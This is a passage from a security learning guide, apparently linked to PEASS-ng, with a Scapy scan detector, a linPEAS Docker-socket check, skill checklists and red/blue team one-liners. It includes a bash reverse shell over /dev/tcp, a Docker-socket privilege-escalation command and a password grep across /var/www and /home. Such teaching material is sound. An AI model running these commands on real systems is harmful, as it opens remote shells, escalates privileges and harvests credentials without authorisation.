    """Analyze each packet for suspicious activity"""

    if packet.haslayer(IP) and packet.haslayer(TCP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        tcp_sport = packet[TCP].sport
        tcp_dport = packet[TCP].dport
        flags = packet[TCP].flags

        # Detect SYN scan
        if flags == 'S':
            print(f"[!] Possible SYN scan from {ip_src} to {ip_dst}:{tcp_dport}")

        # Detect port scan (multiple SYNs to different ports)
        # (would need to track state)

        # Detect suspicious ports
        suspicious_ports = [4444, 31337, 1337, 6666]
        if tcp_dport in suspicious_ports or tcp_sport in suspicious_ports:
            print(f"[!] Suspicious port activity: {ip_src}:{tcp_sport} -> {ip_dst}:{tcp_dport}")

if __name__ == "__main__":
    print("Starting packet capture...")
    sniff(prn=packet_callback, store=0)
```

**Enhancements to add:**
- Pattern matching for known attacks
- Logging to file
- Integration with fail2ban
- Machine learning for anomaly detection

#### 4. PEASS-ng Module

Contribute to PEASS-ng by adding a new check:

```bash
cd linPEAS

# Example: Add a check for Docker socket exposure
cat >> linpeas.sh << 'EOF'

echo ""
echo "════════════════════════════════════════════════════════════════════════════════════════════════════"
echo "══════════════════════════════════╣ Docker Socket Check ╠══════════════════════════════════"
echo "════════════════════════════════════════════════════════════════════════════════════════════════════"

if [ -S "/var/run/docker.sock" ]; then
  echo "Docker socket found: /var/run/docker.sock"
  ls -la /var/run/docker.sock

  if [ -w "/var/run/docker.sock" ]; then
    echo "WARNING: Docker socket is writable! This can lead to privilege escalation."
    echo "Exploit: docker run -v /:/hostfs -it ubuntu chroot /hostfs"
  fi
fi
EOF
```

### Contributing to Open Source

**How to contribute to PEASS-ng:**

1. Fork the repository
2. Create a branch for your feature
3. Make your changes
4. Test thoroughly
5. Submit a pull request

**Ideas for contributions:**
- New privilege escalation checks
- Improved output formatting
- Additional platform support
- Bug fixes
- Documentation improvements

---

## Tracking Your Progress

### Skills Checklist

**Linux Fundamentals:**
- [ ] Navigate file system efficiently
- [ ] Understand permissions (chmod, chown, umask)
- [ ] Manage processes (ps, top, kill, jobs)
- [ ] Use text processing (grep, sed, awk, cut)
- [ ] Write basic bash scripts
- [ ] Understand systemd/init

**Networking:**
- [ ] Understand TCP/IP model
- [ ] Know common ports and protocols
- [ ] Can use nmap effectively
- [ ] Can capture and analyze traffic (tcpdump, Wireshark)
- [ ] Understand DNS, HTTP, SSH

**Web Security:**
- [ ] Identify OWASP Top 10 vulnerabilities
- [ ] Exploit SQL injection
- [ ] Exploit XSS
- [ ] Use Burp Suite proficiently
- [ ] Understand authentication/authorization

**Linux PrivEsc:**
- [ ] Find and exploit SUID binaries
- [ ] Exploit sudo misconfigurations
- [ ] Abuse cron jobs
- [ ] Exploit kernel vulnerabilities
- [ ] Understand capabilities and ACLs

**Post-Exploitation:**
- [ ] Maintain persistence
- [ ] Harvest credentials
- [ ] Pivot to other systems
- [ ] Exfiltrate data
- [ ] Cover tracks

**Blue Team:**
- [ ] Analyze logs effectively
- [ ] Write detection rules
- [ ] Perform incident response
- [ ] Conduct forensic analysis
- [ ] Harden systems

**Tools:**
- [ ] nmap (advanced usage)
- [ ] Wireshark (filter and analyze)
- [ ] Burp Suite (all modules)
- [ ] Metasploit (basic to intermediate)
- [ ] osquery (write complex queries)
- [ ] LinPEAS (understand all checks)

### Lab Completion Tracker

**TryHackMe Paths:**
- [ ] Complete Beginner (64 hours)
- [ ] Jr Penetration Tester (32 hours)
- [ ] Offensive Pentesting (47 hours)
- [ ] Cyber Defense (48 hours)

**HackTheBox Boxes:**
- [ ] 10 Easy boxes
- [ ] 10 Medium boxes
- [ ] 5 Hard boxes

**PortSwigger Academy:**
- [ ] SQL Injection (all labs)
- [ ] XSS (all labs)
- [ ] CSRF (all labs)
- [ ] Access Control (all labs)

### Knowledge Building

**Create your own:**
- [ ] Command cheat sheets
- [ ] Methodology documents
- [ ] Write-ups for each box/challenge
- [ ] Personal wiki/notes system
- [ ] Blog posts explaining techniques

---

## Final Thoughts

### Learning Philosophy

**"Try Harder" - but smartly:**
- Don't just run tools, understand what they do
- Read the source code of tools you use
- When stuck, enumerate more
- Document everything
- Help others learn

**Continuous improvement:**
- Security changes rapidly - stay updated
- Read security news daily
- Follow researchers on Twitter/X
- Attend conferences when possible
- Practice every day, even if just 15 minutes

**Ethics matter:**
- Only test systems you own or have permission to test
- Responsible disclosure for vulnerabilities
- Use skills for defense, not harm
- Give back to the community

### Next Steps

1. **Choose your path:** Offensive (red team) or Defensive (blue team)
   - Or both! Purple team is valuable

2. **Set a goal:**
   - "Pass OSCP in 6 months"
   - "Get SOC analyst job"
   - "Complete 50 HackTheBox machines"

3. **Create a schedule:**
   - Daily practice time
   - Weekly goals
   - Monthly milestones

4. **Track progress:**
   - Use this guide's checklists
   - Keep a learning journal
   - Write up what you learn

5. **Join the community:**
   - Participate in forums
   - Attend local meetups
   - Contribute to open source (like PEASS-ng!)

6. **Stay curious:**
   - Always ask "why does this work?"
   - Break things (safely) to learn
   - Read code, docs, RFCs

**Remember:** Everyone starts as a beginner. The security community is generally welcoming to those who show genuine interest and effort. Don't be afraid to ask questions!

---

## Quick Reference Commands

### Red Team One-Liners

```bash
# Network enumeration
nmap -sV -sC -oA scan 10.10.10.10

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# D-Bus enumeration
dbus-send --session --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Find writable directories
find / -writable -type d 2>/dev/null

# Search for passwords
grep -r "password" /var/www /home 2>/dev/null

# Reverse shell
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

### Blue Team One-Liners

```bash
# Check listening ports
ss -tulpn

# Find recently modified files
find / -type f -mtime -1 2>/dev/null

# Monitor auth logs
tail -f /var/log/auth.log | grep -i "failed\|error"

# Check for rootkits
sudo chkrootkit

# Osquery suspicious process
osqueryi "SELECT * FROM processes WHERE on_disk = 0;"

# Check file integrity
sudo aide --check

# Network connections
osqueryi "SELECT * FROM process_open_sockets;"

# Capture suspicious traffic
sudo tcpdump -i any 'port 4444 or port 31337' -w /tmp/suspicious.pcap
```

---

**Version:** 1.0
**Last Updated:** 2025
**Maintained by:** PEASS-ng Community

For questions, issues, or contributions, visit: https://github.com/peass-ng/PEASS-ng

Happy hacking (ethically)! 🔐
